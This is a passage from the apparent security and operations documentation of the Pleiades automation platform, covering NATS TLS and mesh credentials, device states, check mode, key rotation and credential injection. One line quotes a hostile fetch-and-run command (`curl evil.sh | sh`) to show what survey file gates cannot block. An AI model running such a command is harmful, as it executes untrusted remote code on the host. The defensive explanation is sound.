a live shape different from the one its build declares logs a warning naming each
setting that differs, and carries on. That warning is worth reading: it means a
service is running against settings it does not expect, which during an upgrade is
normal and afterwards is not.

One reshape is refused rather than performed. Narrowing the set of subjects the
stream captures would orphan anything already published under a removed subject,
with no error from the server, so the controller refuses that change and says so
instead of making it.

### Reaching the broker through somebody else's network, and encrypting the wire

Two separate things, often confused, and the confusion matters enough to state
plainly before either.

**WebSocket is path traversal. It is not link resilience.** A `wss://` connection
gets you to a broker on port 443, through an HTTP proxy, a corporate egress filter,
or a CDN that terminates TLS. That is genuinely valuable for a runner on a network
you do not control. What it does **not** do is tolerate a link that drops. WebSocket
runs over TCP: a reset kills it exactly as it kills `nats://`, and reconnecting
costs a TLS handshake plus an HTTP upgrade, which is strictly more work than plain
NATS. Surviving an outage is the reconnection behaviour described above, and that
applies to every transport equally. Choose a WebSocket transport for reachability,
never for resilience.

That cost has been measured rather than asserted, against real brokers, and the
breakdown is more useful than the headline:

| Scheme | Time to a usable connection | Allocations |
|---|---|---|
| `nats://` | 609 us | 145 |
| `ws://` | 615 us | 190 |
| `tls://` | 1245 us | 577 |
| `wss://` | 1207 us | 625 |

So `wss://` does cost about twice what `nats://` costs on every reconnect. But
almost none of that is the WebSocket upgrade: `ws://` is within one percent of
`nats://`, and the difference is inside run to run noise. The TLS handshake is
essentially the whole of it, which is why `tls://` and `wss://` measure the same.
Two practical consequences. If you already run `tls://`, moving to `wss://` for
reachability costs you nothing. If you run `nats://` and move to `wss://`, what you
are paying for is the encryption you also gained, not the traversal. Absolute
numbers move with the machine; re-run `go test ./internal/topology/ -bench
BenchmarkTransportConnect` if a decision depends on them.

QUIC is the thing that actually survives a path change, because its connection
identifiers outlive the address and port tuple. NATS does not speak it, on either
side: there is no QUIC dialer in the client and no QUIC listener in the server.
Riding QUIC means an external tunnel process, which is a deployment choice rather
than something this software does.

**Accepted URL schemes.** `NATS_URL` is validated at startup, and anything outside
this list is refused rather than guessed at. "At startup" is literal: both the
controller and the runner check it while reading configuration, before the
controller binds its listener or migrates its database, so a typo cannot produce a
process that answers `/healthz` for the several seconds it takes to reach the
broker and then exits.

| Scheme | Transport | Encrypted |
|---|---|---|
| `nats://` | TCP | no |
| `tls://` | TCP | yes |
| `ws://` | WebSocket | no |
| `wss://` | WebSocket | yes |

Two mistakes it exists to catch. A bare `host:port` with no scheme used to be
accepted and treated as plaintext, so an omitted scheme silently meant
unencrypted; it is now refused with the two spellings you probably meant. And a
comma separated list mixing encrypted and plaintext entries is refused, because
which member a client picks is not something you control, so the plaintext one
decides what an attacker sees.

**Encrypting the wire.** Point `NATS_URL` at `tls://` (or `wss://`) and, if your
broker uses a private authority, set `NATS_CA_FILE` to the certificate that signed
it. Leaving it unset verifies against the system pool, which is right for a
publicly signed broker. Setting `NATS_CA_FILE` while the URL is plaintext is a
startup error rather than a warning: that pair reads as a protected connection and
is not one.

For the in-chart broker, `nats.tls.enabled` with `nats.tls.secretName` naming a
`kubernetes.io/tls` Secret serves TLS, and `nats.websocket.enabled` adds a
WebSocket listener (`nats.websocket.tls` serves it over TLS using the same
material). Enabling either writes the broker's first configuration file; everything
that was already a command line flag stays one.

`nats.websocket.tls` without `nats.tls.enabled` is a supported arrangement, not an
oversight: it serves `wss://` to the outside while the in-cluster client listener
stays plaintext `nats://`, which is what you want when only the WebSocket port is
published. It needs `nats.tls.secretName` either way, since both listeners read the
same two files.

**Terminating TLS in front of the broker instead.** The other shape, and the one
`wss://` mainly exists for, is an ingress or a CDN that terminates TLS and forwards
a plain HTTP upgrade to `nats.websocket.enabled` with `nats.websocket.tls` left
off. Point `NATS_URL` at the proxy with `wss://` and set `NATS_CA_FILE` to whatever
signed the proxy's certificate, not the broker's. The proxy has to be a real HTTP
proxy that forwards the `Upgrade` and `Connection` headers and speaks HTTP/1.1
upstream: a TCP forwarder will not do, and neither will a proxy that negotiates
HTTP/2 to the client, because an HTTP/2 connection cannot carry an HTTP/1.1
upgrade. This whole path is exercised end to end by a release gate that stands a
real nginx in front of a real broker and drives it with the real binaries.

**This encrypts. It does not authenticate.** TLS stops a network observer reading
your traffic and lets a client verify it is talking to your broker. It says
nothing about which clients may connect, or what subjects they may read: with TLS
alone the broker still accepts any client that completes a handshake, and a
dispatch message carries the credentials its job runs with.

The two are separate settings and either works without the other. Client identity
is [Mesh identity](#mesh-identity-authenticating-the-bus) below. Restrict network
access to the broker regardless of which of them you have on.

Two things worth knowing because they fail quietly. The chart's readiness probe for
the broker is a plain TCP connect, so it keeps passing even if the TLS
configuration is wrong, and the first sign of a bad certificate will be clients
failing rather than the pod. And the compose stack's broker healthcheck connects
anonymously and without TLS, so turning on broker TLS there needs that probe
changed too.

### Mesh identity: authenticating the bus

TLS above encrypts the wire and proves the broker is yours. This decides **which
clients may connect and what subjects each of them may use.** They are separate,
and neither implies the other.

It is **off by default**, and stays off when you upgrade. That is a compatibility
choice, not an unfinished one.

#### Turning it on

Three commands and one restart. The first mints the key hierarchy:

```
controller mesh init --dir ./deploy/mesh
```

That writes `nats.conf` for the broker, and `operator.nk`, which is the operator
key. **Move `operator.nk` off the machine.** It can mint a new account, and a new
account is a new tenant of your mesh. Nothing in a running deployment reads it;
you need it again only to re-mint an account or to publish a revocation.

Then a credential for each process, and point each at its file with
`NATS_CREDS_FILE`:

```
controller mesh issue --out ./deploy/mesh/controller.creds --label controller
controller mesh issue --out ./deploy/mesh/runner.creds     --label runner
```

For compose, apply the overlay, which does all of this wiring:

```
docker compose -f docker-compose.yml -f docker-compose.mesh-auth.yml up -d --wait
```

For the chart, copy the values out of the generated `nats.conf` into
`nats.auth`, create Secrets from the two credential files, and set
`mesh.credentials`. The chart refuses combinations that would install cleanly and
not work, naming what is missing.

#### What the Controller holds, and what it does not

NATS decentralized authentication has three keys, and which process holds which
is the entire design:

| Key | Who holds it | What it can do |
|---|---|---|
| Operator | Offline, you | Mint a new account, so a new tenant of the mesh |
| Account identity | Offline, you | Re-mint the account itself |
| Account signing | The Controller | Mint user credentials for that one account |

The Controller holds the third and only the third, sealed under your
`MASTER_ENCRYPTION_KEY` in the same envelope every other secret uses. That
boundary is what keeps a Controller compromise an account compromise rather than
a mesh compromise, and it is enforced rather than documented: the custody code
derives a key's kind before storing it and refuses anything that is not an
account key.

#### What a compromised runner can still do

This is the part worth reading before you rely on any of it. A stolen runner
credential is scoped, not powerless. Within its scope it can still:

- **Read every dispatch for the whole fleet, including the credentials inside
  them.** The fleet shares one durable consumer, and scoping delivery per device
  would need a per-device credential distribution path that does not exist yet.
  This is the single largest residual risk and it is unchanged by this feature.
- Publish logs, results and journal entries for any job id, so it can write
  misleading history.
- Take and hold the execution lease on any device, so it can stall work.

What it **cannot** do, and could before: forge a job launch, widen the shared
consumer to read a subject space it was not granted, cancel another job, or
answer another runner's credential renewal.

So the honest summary is that this shrinks the blast radius of reaching the
broker, and does not shrink the blast radius of stealing a runner's credential.
The dispatch payload is unchanged: authentication decides **who may read the
stream**, not **what is written to it**. Size your broker retention on the
assumption that the stream holds secrets.

#### Credentials expire, and that is load bearing

A credential is a bearer token valid until it expires. A runner's default window
is 30 days; an edge or Smart Hands credential defaults to 12 hours and is meant
to be shorter still.

When one lapses the broker **evicts the connection**, and the client stops
reconnecting rather than retrying forever. That is correct, and it fails quietly:
the process is healthy and idle, and looks exactly like a runner with no work.
Replace a credential before its expiry. `controller mesh issue` prints the date.

#### Revocation is an offline operation

Early revocation means adding the credential's public key to a revocation list
inside the **account JWT**, re-signing that JWT with the operator or account
identity key, and reloading the broker. Both of those keys are the ones you moved
offline, deliberately, so this is a break-glass procedure rather than a control
plane action. Measured against a real broker: a revoked user's live connection is
closed, and the credential cannot reconnect.

Two properties to know before planning around it. A revocation entry is a
timestamp watermark keyed on a public key, so it means "everything issued for
this key at or before this second" rather than "this one credential", and its
coverage only ever widens. And the list has to reach the broker's resolver, which
for the configuration this chart writes means a file and a reload.

**If your exposure window matters, shorten expiry rather than planning to
revoke.**

#### Why not client certificates

Identity rides in the credential rather than in a TLS client certificate on
purpose. A client certificate is stripped by any L7 proxy that terminates the
connection, which would put this feature in direct conflict with reaching the
broker over `wss://` through exactly such a proxy. Carrying identity in the
payload means the same credential works whether you reach the broker directly or
through an ingress that terminates TLS.

### Blast radius is always computed, never authored

Before `pleiades run` executes a runbook, it prints the blast radius: the number of
distinct inventory devices the runbook targets (deduplicated, across every
`pretasks`/`tasks`/`posttasks` task and every `block`/`rescue`/`always` descendant),
and the distinct set of `tier` property values those devices declare. This is
computed fresh from the runbook and the current inventory state at call time; a
runbook author never writes a `blast_radius:` field by hand, and a stale one can
never exist. There is no defined tier ranking today (no built-in notion that `prod`
outranks `lab`), so blast radius reports the raw set of tiers touched, not a single
worst-case severity score.

### Only an active device accepts work

Every inventory item carries one of eight lifecycle states
(`discovered`, `quarantined`, `onboarding`, `active`, `simulate-locked`,
`unreachable`, `decommissioning`, `archived`). Only `active` accepts real work.
`pleiades validate` rejects any task whose target resolves to a non-active device,
by name, before anything runs; the Crawl-tier executor and the Walk-tier dispatcher
both re-check the same rule at their own layer as well, so a device is never
executed against by a path that happened to skip validation.

The one exception is a check. A `simulate-locked` device, the state a read-only sync
source gives every device it adds, accepts a check and nothing else, on both tiers and by
the same rule, so a device nobody has approved for changes can be asked what a run would
change before anyone promotes it. A check from an external Collection program is still
refused there, because nothing has proven that the program only reads. A `quarantined`
device accepts nothing, not even a check.

### How a device gets its state

A device's lifecycle state is set once when the device is added, and after that only by
an operator.

- **Added by a sync.** `pleiades inventory sync` reads an upstream source through a sync
  plugin, which classifies each record onto a device type and a set of capabilities.
  Where a new device lands depends on the source. A read-only source, which today is
  `catalyst_center` and `aws`, lands every device it adds as `simulate-locked`, so it can
  be checked but not changed until someone promotes it. `static_yaml` lands its entries as
  `active`. The **Read-only** column of the [sync plugin reference](reference/plugins.md)
  says which a source is.
- **Quarantined, and not added.** A record a plugin cannot place is quarantined with a
  reason, and it is **not** added to the inventory, since a device needs a type to exist.
  For example, `catalyst_center` quarantines a device whose software type is neither IOS
  nor IOS-XE, `aws` quarantines an instance whose platform has no classification rule,
  and `static_yaml` quarantines an entry whose `classify` path does not resolve, while the
  rest of the file still syncs. The sync's own report is the only place this shows: it lists each such record
  under "devices needing review", with its reason, including on a `--read-only` preview.
  Fix the source or wait for a plugin that can place the record; there is nothing in the
  inventory to promote.
- **Added through the API or the web UI.** A device created there is `active`, unless its
  type is a generic one (below).
- **A generic device is onboarded.** A `generic_ssh`, `generic_netconf`, `generic_http` or
  `generic_grpc` device, however it was added, starts `discovered`, which runs nothing.
  Onboarding (`pleiades onboard <name>`, or `POST /api/v1/inventory/devices/{name}/onboard`)
  moves it to `onboarding`, probes it over its protocol, and moves it to `active` when the
  probe proves the device; a failed first probe leaves it `onboarding` with the reason in the
  answer. Onboarding refuses a device an administrator put in `quarantined`,
  `simulate-locked`, `decommissioning` or `archived`. Onboarding an `active` device again
  re-probes it and records only what changed.
- **Promotion, and any other change.** `PATCH /api/v1/inventory/devices/{name}` with a body
  such as `{"state": "active"}` sets any of the eight states, and needs `inventory:write`,
  which operators and admins hold. Each change is recorded as a revision in the device's
  history, and setting the state a device already has records nothing. An operator can
  also quarantine a device this way, which stops it taking any work. No command-line
  command or web UI control changes a state yet.
- **A later sync keeps it.** A sync updates a device's properties from its source, never
  its state, so a device promoted to `active` stays `active` however often its source is
  synced.
- **Retirement.** `DELETE /api/v1/inventory/devices/{name}` moves a device to `archived`,
  recording that too, rather than deleting it or its history.

### Locking

**The Crawl-tier CLI's locking is in-process only. Two `pleiades run` invocations do
not exclude each other.** `cmd/pleiades/run.go` wires `lock.NewInProcessManager`,
whose own doc comment says it "only guards against concurrent access within this
process." Every `pleiades run` is a separate process that starts with its own empty
lock table, so a lock one run holds is invisible to every other run. Two runs on the
same machine can configure the same device at the same second. This lock manager holds
a plain in-memory map and touches neither the network nor the filesystem, so two
machines cannot exclude each other either.
This is measured, not inferred: two `pleiades run` processes started one second apart
against the same device were both connecting to it at the same instant, each with its
own socket, and neither reported any contention.

A real distributed lock manager does exist (`lock.NewNatsLockManager`, backed by NATS
JetStream), and only the `controller` and `runner` binaries construct it. Since Phase
16 the distributed execution plane does reach real devices, so that tier both runs for
real and holds a per-device lease while it does. The gap is now narrower and lives
entirely on this side: the Crawl-tier CLI still has no distributed locking, so two
concurrent `pleiades run` invocations against one device do not coordinate.

**What to do instead:** serialize device access outside Pleiades. Run one
`pleiades run` at a time per device set. If more than one person or scheduler can start
a run, gate it with your own mutual exclusion: a CI concurrency group, a change window,
or a `flock` on a shared path. Do not rely on Pleiades to stop two operators from
touching one router.

`lock_acquisition:` controls *when* a task takes its locks, and its scope is a single
task, not the whole run. `per_device_as_reached` (the default) locks each device only
as execution reaches it, so one contended device does not stop that task's other
devices. `all_at_plan_time` locks every device that *that one task* targets up front,
all-or-nothing: if any one of them is contended, that task runs against none of them.
It does not lock the run's whole device set before the first task, so the name oversells
it. A later task set to `all_at_plan_time` still fails only once execution reaches it,
after earlier tasks have already changed earlier devices. Both strategies lock per
device, never a whole job, so two tasks targeting disjoint device sets never block each
other.

### Safety versus dry-run

`pleiades validate` checks a runbook without touching a device: it loads the inventory
and runbook, runs every registered validation rule (lifecycle gating, collection
reachability, conditional compilation, and more), and reports every finding. Capability
matching is the one rule that barely runs: it covers only the two legacy action names
`ssh_exec` and `ios_backup`, never a catalog FQCN, so `validate` passes a task pointed at
a device that cannot run it. See [Start here](01-start-here.md#implementation-status).
`pleiades run` always validates first and refuses to execute if validation reports any
error.

A check goes further: it connects, reads each device, and reports what each task would
change, changing nothing. On the command line that is `pleiades run --mode check` (see
[Get started](02-get-started.md)). On the Controller it is a template's check route,
`POST /api/v1/templates/{id}/check`, which takes the launch route's body, or a launch
whose `mode` field says `check`. A check asked for at any level wins without the
template having to open its mode field, since it can only make a run change less; a
request that would turn a check back into a real run is refused, and so is a check of an
Ansible playbook template, which cannot be run as one. A job records its mode, and the
API's job responses and the Jobs page show it, so a check that completed is never read as
a change that was made. Relaunching a check makes another check.

What a check promises, on either tier: nothing on a device is changed, no run journal is
written and no undo instruction is recorded, and every result it reports carries
`predicted: true`, so a stored or forwarded result cannot pass for one that happened. A
condition is answered wherever the tasks a check could not answer do not decide it, and a
task whose condition they do decide is named as unchecked too. A device still being
approved for changes (`simulate-locked`) accepts a check and nothing else, and only from a
method built into Pleiades. On the command line a check ends with status 0 when every task was
checked, 3 when some were not and nothing failed, and 1 when anything failed, so a
pipeline can gate on it; `--allow-unchecked <method>` accepts named gaps on purpose.

A script should use the check route rather than the launch route's `mode` field. A
Controller older than check mode answers the check route with 404, but it has no mode
field, so it would run a launch asking for a check for real, listing `mode` among the
response's `ignored_fields`.

Only methods that declare check support can be checked; every other task is named as
unchecked rather than run. A finished check job says whether it covered everything:
the job's `check_complete` is true only when every device it targeted was checked,
successfully, with no task left unchecked, and its `unchecked` count, and each device's,
say how many tasks were not. A device skipped as not active, or whose check failed,
leaves the check incomplete, since it was not looked at. Each device's result reason
also says "check incomplete: N task(s) could not be checked", which a Controller older
than the count still shows.

The check route needs `runbook:check`, which `runbook:execute` implies, so a token can be
minted for drift checks alone: it may check any template it could otherwise launch and
may not launch one for real. No built-in role holds `runbook:check` without
`runbook:execute`, so a check-only principal is a token issued with exactly that scope.
A check still connects to devices with their real credentials and reads them. What a
check-only caller's check never does is run an external Collection program's check,
which nothing has proven only reads: those tasks are reported unchecked, and the check
is incomplete. Relaunching a job still needs `runbook:execute`; a check-only caller runs
the check again through the check route.

**Upgrading Runners.** A check travels to Runners on its own subject,
`pleiades.jobs.check.<device>`, through its own durable consumer, `runner-check`, which a
Runner creates when it starts. A Runner built before check mode existed never reads that
subject, so during a rolling upgrade a check waits for an upgraded Runner rather than
being run for real by an older one. It waits as long as the stream keeps messages (see
[One number sets how long an outage may last](#one-number-sets-how-long-an-outage-may-last)),
exactly as a real run waits when no Runner is up at all. Nothing needs configuring; if
checks sit waiting, look for Runners that have not been upgraded.

## Security and credentials

### Operator accounts and sign-in

Create the first administrator on the host, before anybody can sign in:

```bash
controller bootstrap-admin --email you@example.com
```

It prompts for a password with echo disabled, creates the user, puts it in a team,
and grants that team system-scope admin. Re-running it is safe: the identity is left
alone and an existing password is refused rather than replaced, unless you pass
`--force`. For automation, `--password-stdin` reads the password as one line on
standard input:

```bash
echo "$PASSWORD" | controller bootstrap-admin --email you@example.com --password-stdin
```

A password is never accepted as a flag value on any path, because a flag is visible
in shell history and in the process argument list to every other user on the machine
for as long as it runs.

The other two commands are the recovery paths:

| Command | What it does |
|---|---|
| `controller reset-password --email <address>` | Replaces the password and revokes every session that account holds. Marks the password as needing to be changed at next sign-in. |
| `controller unlock --email <address>` | Clears a lockout without touching the password. |

**There is no password reset by email, deliberately.** Adding one would make the
first sign-in on a fresh machine depend on outbound mail working, which is the wrong
thing to put between an operator and their own control plane. Both commands run over
the shell access you already have.

**How a password is stored.** Argon2id, 19 MiB of memory, two passes, one lane, with
a 16-byte random salt per password, encoded as a PHC string so the parameters travel
with the hash and a later cost increase needs no migration. A password verified at
older parameters is transparently re-hashed at the current ones on the next
successful sign-in. It is a one-way hash and not encryption: nothing in the system
can recover a password, including you.

**Lockout.** Ten consecutive failures lock an account for fifteen minutes. The
counter is a row in the shared database rather than per-process state, so it is not
reset by a restart and cannot be multiplied by running more replicas. The expiry does
not reset the counter, so the next burst re-locks immediately. Nothing exempts an
account from lockout, including the first administrator, which is why `unlock` exists
and runs off the network.

**What a sign-in failure tells an attacker: nothing.** A wrong password, an unknown
address, an account with no local password and a locked account all produce the same
response, and all cost the same amount of time. The real reason is written to the
controller's log, where an operator can read it and a caller cannot.

**Signing in with a token still works** and is the only route for a deployment that
federates against an external issuer and holds no local passwords at all.

### Threat model, briefly

Pleiades stores two classes of durable secret.

The first is device credentials: a username plus a password or an SSH private key,
keyed by device name, encrypted at rest in a local file. This is the Crawl tier's
store and it is still what the control plane falls back to when a template binds no
machine credential.

The second is control-plane credentials: a credential of a declared type, holding
whatever inputs that type declares, encrypted at rest in the database. These are the
ones bound to templates, and they are what an AWX migration brings with it.

Two external secrets manager integrations are implemented.

The first is a file: a credential input names one, resolved at the moment a job
dispatches rather than when it was created. That covers a Kubernetes projected
volume, a Vault Agent sidecar and the External Secrets Operator, which is how
secrets arrive in a large fraction of deployments. It needs no client and no
network call on the dispatch path.

The second is **HashiCorp Vault**, reading a key/value secret directly over its
HTTP API, on either a v1 or a v2 mount. The certificate chain is always verified
and there is no option anywhere to skip it; a Vault with a private authority is
reached by pasting that authority into the source credential. Configure it as an
input source, described below, rather than as a reference string: a Vault needs an
address and a token, and a reference string has nowhere to put either.

Seven further sources are named after their AWX equivalents and return an explicit
"declared but not implemented" error: HashiCorp Vault signed SSH, AWS Secrets
Manager, Azure Key Vault, CyberArk Conjur, Centrify, and the two Thycotic products.
Read that as a real constraint when deciding whether Pleiades fits an environment
that mandates one of them, not as a gap to work around.

### Input sources: an input supplied by another credential

There are two ways a credential says an input lives somewhere else, and they exist
side by side.

The first is a reference string, described above: the input names a source and a
path, and the source itself is configured once for the whole controller. That is
right for a file, because a projected volume is a property of the deployment rather
than of any one credential.

The second is an **input source**: the input is bound to another credential, an
external-kind one holding that secret manager's own address and token, plus the
metadata saying where in it to look. Bind them through
`PUT /api/v1/credentials/{id}/input-sources`, or in the same request that creates
the credential. This is the model AWX uses, and it exists because a vault address
and a vault token are themselves credentials: they need rotating, an audit trail
and RBAC, and a string in a column is none of those.

Rotating the source is the point. Every target that reads through it picks up the
new value on its next run, with no edit to any of them, because resolution happens
when a job dispatches rather than when the binding was written.

Four things are refused when you write a binding, rather than when a job later
trips over them: an input the credential's type does not declare, a source in
another organization, a binding to an ordinary credential that does not say which
of its fields to read, and a set that would make resolution return to the
credential it started from.

A source credential's own inputs may themselves be bound to a further source, and
that chain is bounded at **four hops**. Past that the resolution is refused by name
rather than followed, because every link is an ordinary row that anyone who can
write credentials can add, and an unbounded walk would be a denial of service
against the controller reachable from ordinary data. A chain that returns to where
it started is reported as a cycle rather than as depth, since the two need
different fixes.

The source credential's **kind** is what decides how a binding is resolved, and
there are two answers.

An **external-kind** source is a secret manager: the binding's metadata addresses a
secret inside it, and that address is decoded by the source's own client. The set
you can bind to is the set of external-kind types this release ships, which today
is HashiCorp Vault. A binding whose source type nothing can build fails with an
explicit error naming that source and listing the ones this controller has, in the
same way a declared-but-unimplemented source does, so the set shrinks honestly as
real sources land rather than a binding quietly resolving to nothing.

Any **other kind** is an ordinary credential, and the input is filled from one of
its own fields. Name that field in the binding's `source_field` metadata. Nothing
is fetched and no network call happens: the value is already in a row this
controller holds. This is how one stored password serves several credentials that
each need it, and it is what a certificate bundle's passphrase is bound to, below.
A field the source's type does not declare is refused when you write the binding; a
field that is declared but empty is reported by name when the job runs, since a
credential can be filled in after it is bound.

The two compose, and that is worth knowing because it is the useful arrangement
rather than a curiosity: the ordinary credential a binding reads a field from may
itself read that field out of Vault. The certificate credential does not know that,
and does not have to.

For a Vault source, the binding's metadata carries AWX's own field names, so an AWX
`CredentialInputSource` row maps across without translation: `secret_backend` (the
mount, defaulting to `secret`), `secret_path`, `secret_key`, and optionally
`secret_version`. A path element that would address something other than the secret
it names, such as a `..`, is refused rather than cleaned.

### Rotating the master key

`MASTER_ENCRYPTION_KEY` can be replaced without downtime, and without losing
anything, as long as the old key stays available while the change is in flight.

Set the new key as the current one and the old key as the previous one:

| Variable | Value |
|---|---|
| `MASTER_ENCRYPTION_KEY` | the new key |
| `MASTER_ENCRYPTION_KEY_VERSION` | a new tag, for example `v2` |
| `MASTER_ENCRYPTION_KEY_PREVIOUS` | the old key |
| `MASTER_ENCRYPTION_KEY_PREVIOUS_VERSION` | the old tag, `v1` unless you set one |
| `ROTATE_ENCRYPTION_KEYS` | `true` |

Every read tries the current key and falls back to the previous, so nothing
breaks the moment the process restarts. With `ROTATE_ENCRYPTION_KEYS=true` the
controller then re-encrypts every row under the new key, in the background, once
per start. There is one pass per column that stores a secret: credentials,
devices, saved launch configurations and mesh signing keys. Each pass logs one
line, `key rotation pass finished`, with the table and three counts:

- `rotated`: re-encrypted under the new key.
- `skipped`: readable, but not rewritten this time, because something else wrote
  the row at the same moment or the write failed. These rows are still on the old
  key.
- `unreadable`: the row opens under neither key. Removing the old key does not
  change these rows, because the old key could not open them either. Find out
  where they came from.

**Do not remove the old key until the controller logs `key rotation complete: no
row needs MASTER_ENCRYPTION_KEY_PREVIOUS any more`.** It logs that only when every
table was read and no row was skipped. If it logs `key rotation is incomplete`
instead, keep the old key and restart for another pass. A row that has not been
re-encrypted yet can only be opened with the old key, so taking it away early
makes that row permanently unreadable.

Before this release the controller rotated devices alone while this section
described three passes. If you removed an old key after following an earlier copy
of it, your credentials and saved survey answers are still encrypted under that
old key. Restore it as `MASTER_ENCRYPTION_KEY_PREVIOUS` and rotate again.

The passes also do a second job. Devices and saved launch configurations used to
be encrypted without binding the ciphertext to the row it belongs to, which meant
a value copied from one row to another would still decrypt. That is closed now,
and a rotation pass is what converts an older row to the new form.

A device converts itself as a side effect of ordinary use, because anything that
writes its properties rewrites them bound. **A saved launch configuration does
not**: nothing in this platform ever rewrites its answers, so a rotation pass is
the only thing that will ever migrate one. Survey answers are the one path by
which a password reaches a stored row, so that pass is worth running even if you
are not changing keys. A survey `file` answer is stored the same way and is
covered by the same pass, and it is typically larger and more likely to be key
material.

One thing that pass does **not** cover, stated because it is easy to assume
otherwise: a job's own `extra_vars` column holds the same resolved values and has
no encryption hook, so a secret survey answer is encrypted in the saved
configuration and in the clear in the job record, in the same database. A survey
answer's value is also not added to the log masker, so a task that echoes one
lands it in the job log unredacted.

### Survey file questions

A survey can ask for a file, and by default the platform refuses one that opens
with an interpreter line (`#!`). Two independent gates have to be open before such
an answer is accepted, and neither is settable by the person launching the job:

- `PLEIADES_SURVEY_FILE_ALLOW_PROGRAM_CONTENT`, set on the **Controller**, is the
  deployment's consent. Unset means refuse. It is read at startup, logged as a
  warning on every start when it is on, and consulted at every launch, so clearing
  it and restarting stops templates that already carry the flag rather than only
  stopping new ones being authored.
- `allow_program_content` on the question itself, set by the template author.

Neither grants anything alone. What they buy is separation of duty, not a sandbox:
this refuses a file that *announces* itself as a program, and cannot refuse one
that *is* one. A text file holding `curl evil.sh | sh` is accepted with both gates
shut, because what an answer can do is decided by what the automation does with it.
A runbook may already pipe any text answer to a shell with no flag at all.

Binary content is refused unconditionally, whatever the gates say: an answer must
be valid UTF-8 with no NUL byte and no byte-order mark, and at most 32 KiB.

### Where a project's source may come from

A project names a repository, a sync clones it, and a template then runs what was
cloned against managed devices. That last clause is why the address is constrained:
the content of a clone is code, so how it arrived decides whether the code is the
code somebody wrote.

By default a project is fetched over **https or ssh** only. Three things are
refused, each with its own opt-in on the **Controller**, unset meaning refuse:

- `PLEIADES_PROJECT_ALLOW_INSECURE_SOURCE` admits plain `http` and the git daemon
  protocol (`git://`). Neither proves what sent the code or stops it being changed
  in transit, and `http` additionally puts a bound credential's password on the
  wire. Set it only where the network between the Controller and the mirror is one
  you would run unauthenticated automation across.
- `PLEIADES_PROJECT_ALLOW_LOCAL_SOURCE` admits `file://` URLs and bare paths, which
  is a repository on the Controller's own disk. Note that a URL with no scheme at
  all is a local path, so this also covers `/srv/repos/x` and `../x`.
- A password in the URL (`https://user:token@host/repo`) is refused outright, with
  no toggle. `scm_url` is an ordinary column while a credential is encrypted, so the
  two are not equivalent places to put a secret. An existing project that already
  carries one keeps syncing; it is refused the next time somebody saves that
  project, which is the moment there is somewhere better to put it.

Both toggles are read once at startup and logged as a warning on every start when
either is on, so an operator reading a boot log sees what a deployment permits. A
refusal is answered at the write, where somebody can fix it, and again at the sync,
because a row can predate the rule or the toggle can be taken away.

Three limits worth knowing, none of which this mechanism claims to cover:

- **It is not a host allowlist.** git reads anything shaped like `host:path` as an
  ssh address, so an allowed protocol still reaches any host the Controller can
  resolve. Restricting that is a network question, not a URL one.
- **Redirects are followed.** An allowed `https` address can redirect elsewhere,
  including to plain http, without passing the check again.
- **git over ssh does not use this platform's `known_hosts`.** A clone verifies
  against the library's own default rather than the file `PLEIADES_KNOWN_HOSTS`
  names, and the shipped image carries no such file, so an ssh project needs one
  mounted before it can verify a host at all. In the image as shipped, https is the
  only source that works without further setup.

### Credential storage

`pleiades add-credential <device> --username <user>` prompts for a password or a
private-key path (never accepting a secret as a bare CLI flag value, since that
would be visible in shell history and to any other user on the same machine for as
long as the process runs) and writes it to `<project>/.pleiades/credentials.yaml`,
encrypted field-by-field with AES-256-GCM.

The 32-byte master key is resolved in this order, and the choice is never silent:

1. The `PLEIADES_MASTER_KEY` environment variable, if set (base64-encoded). A
   malformed value is a hard error; a deliberately set env var is never silently
   ignored in favor of the file.
2. `<project>/.pleiades/master.key`, if it already exists. A corrupt or
   wrong-length file is a hard error, never silently regenerated (regenerating
   would produce a key that cannot decrypt anything already encrypted under the
   old one).
3. Otherwise, a fresh key is generated with `crypto/rand` and written to
   `<project>/.pleiades/master.key` with mode `0600`, inside a `0700` directory.

Neither a runbook file nor `inventory.yaml` ever contains a password: the only
place a device's own connection detail (host, port, and anything credential-shaped
an inventory source adds) is stored is `Device.properties`, itself encrypted at
rest with the same AES-256-GCM envelope mechanism in the control plane's database.

### Credential types and the injector engine

A credential type is data: an input schema saying what a credential of that type
holds, and an injector document saying where those inputs go at run time. An
administrator defines one over the API and an AWX export decodes into it directly.

Six types ship with the platform and are installed on every controller start, under
the same namespaces AWX uses: `ssh` (Machine), `vault`, `net` (Network), `aws`,
`controller` (Red Hat Ansible Automation Platform) and `hcp_terraform`. They cannot
be edited or deleted, which is what lets an import reuse them rather than recreating
them as custom copies that silently stop tracking the shipped ones at the next
upgrade. Installing them is a reconcile keyed on namespace rather than a migration,
so a later release that adds a type or corrects one reaches a deployment that already
started.

Sixteen further AWX types are recognised and not implemented. `pleiades import
awx-credential-types <export.json>` reports which is which for your own export, with
the specific reason for each, before you commit to a migration window.

Four things about this are security-relevant in production.

**An injector document is executable.** It decides which environment variables the
customer's playbook runs with, and the playbook runs inside the same container the
credential was injected into. A type that could set `LD_PRELOAD`, `PYTHONPATH`,
`ANSIBLE_CONFIG`, `PATH` or a `BASH_FUNC_` variable would be arbitrary code execution
inside the run it was meant to authenticate, so those names and their relatives are
refused when the type is saved and again when a dispatch reaches it. The container
being single use does not help: the code would run before the container is destroyed.
For the same reason the web UI lists and tests credential types but does not author
them; that stays on the API, where a caller had to construct the request
deliberately.

**Binding is a higher privilege than editing.** Changing what a template runs is
`template:write`. Changing what it runs *as* is `credential:write`, granted
separately, because whoever binds a credential decides which identity the automation
acts under. The UI follows the same split: the control that binds credentials to a
template is gated by the credential scope, not by the template form's own.

**Secrets are never readable back.** Every read path returns a projection with no
field a plaintext value could occupy: a secret input reads back as `$encrypted$` and
there is no endpoint, parameter or header that returns the real thing. It is
decrypted only at dispatch, inside the process that injects it. Submitting the marker
back on an update leaves the stored value alone, so editing an unrelated field does
not destroy a secret.

**A prompted input is never stored.** A type may declare an input asked at launch
rather than saved. The answer travels with that one job and is written nowhere, which
also means a job launched with one cannot be relaunched: the platform says so rather
than silently repeating the run without it.

The residual to plan around is the message bus. Injected material rides the same
JetStream stream every dispatch uses, whose retention is seven days, so a rendered
secret can sit there for that long. This phase makes that worse in volume and
identical in kind: where a dispatch previously carried one flattened SSH credential,
a template binding a cloud credential and two file-generating ones puts several more
on the same message, whole PEM bodies included. The real fix is reference passing,
where the payload carries a handle and the runner fetches it over a
mutually-authenticated short-lived connection.

The runner identity half of that now exists, and the rest does not, so be precise
about what has changed. Pleiades can mint a short-lived, subject-scoped credential
for a runner and a broker can be configured to require one, which is the
